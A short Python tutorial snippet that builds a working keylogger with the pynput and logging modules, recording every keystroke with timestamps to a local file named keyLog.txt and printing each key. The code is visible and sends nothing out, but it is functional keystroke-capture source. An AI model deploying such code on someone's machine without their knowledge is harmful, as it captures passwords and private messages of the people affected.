# keylogger - Which key we will press on our keyboard we can record it by using keylogger.
# We can create a keylogger in python by using pynput module and logging module.

from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename="keyLog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
    logging.info(str(key))
    print(key)
with Listener(on_press=on_press) as listener:
    listener.join()
